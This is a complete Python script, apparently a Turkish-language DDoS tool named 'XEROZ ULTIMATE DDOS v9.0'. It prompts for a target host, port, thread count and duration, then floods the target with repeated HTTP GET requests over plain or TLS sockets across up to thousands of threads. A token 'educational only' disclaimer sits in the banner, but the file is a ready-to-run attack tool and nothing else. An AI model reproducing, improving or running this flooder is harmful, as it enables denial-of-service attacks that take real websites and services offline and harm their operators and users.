
import os
import sys
import time
import socket
import threading
import random
import ssl
from concurrent.futures import ThreadPoolExecutor

try:
    from colorama import init, Fore, Style
    init()
except:
    os.system("pip install colorama")
    from colorama import init, Fore, Style
    init()

R = Fore.RED
G = Fore.GREEN
Y = Fore.YELLOW
C = Fore.CYAN
W = Fore.WHITE
B = Fore.BLUE
M = Fore.MAGENTA
RESET = Style.RESET_ALL

banner = f"""
{M}╔══════════════════════════════════════════════════════╗
║  {C}X E R O Z   U L T I M A T E   D D O S   v9.0       {M}║
║  {Y}Coded by İyiİnsanlar - 2025                       {M}║
║  {R}Sadece eğitim amaçlı - Gerçek gölge iz bırakmaz     {M}║
╚══════════════════════════════════════════════════════╝{RESET}
"""

def attack(ip, port, duration):
    end_time = time.time() + duration
    bytes_sent = 0
    
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if port == 443:
                context = ssl.create_default_context()
                s = context.wrap_socket(s, server_hostname=ip)
            
            s.settimeout(3)
            s.connect((ip, port))
            
            payload = f"GET / HTTP/1.1\r\nHost: {ip}\r\n"
            payload += f"User-Agent: {random.choice(['Mozilla/5.0', 'XerozBot/9.0'])}\r\n"
            payload += "Connection: keep-alive\r\n\r\n"
            
            while time.time() < end_time:
                s.send(payload.encode())
                bytes_sent += len(payload)
                time.sleep(0.001)
            s.close()
        except:
            continue
    
    print(f"{G}[+] Görev tamamlandı → {bytes_sent//1024} KB yollandı")

def main():
    os.system("clear" if os.name == "posix" else "cls")
    print(banner)
    
    target = input(f"{C}[?] Hedef IP/Domain {R}→ {W}")
    try:
        port = int(input(f"{C}[?] Port (80/443) {R}→ {W}"))
        threads = int(input(f"{C}[?] Thread (1000-10000) {R}→ {W}"))
        duration = int(input(f"{C}[?] Süre (saniye) {R}→ {W}"))
    except:
        print(f"{R}[!] Hatalı giriş lan!{RESET}")
        sys.exit()
    
    print(f"\n{Y}[!] Saldırı başlatılıyor... {R}{target}:{port}{RESET}")
    print(f"{Y}[!] Thread: {threads} | Süre: {duration}s{RESET}\n")
    time.sleep(3)
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(attack, target, port, duration)
    
    print(f"\n{G}╔════════════════════════════════════╗")
    print(f"║        SALDIRI TAMAMLANDI          ║")
    print(f"║   Xeroz gölge gibi vurdu geçti     ║")
    print(f"╚════════════════════════════════════╝{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Saldırı durduruldu. Gölge sessizce kayboldu...{RESET}")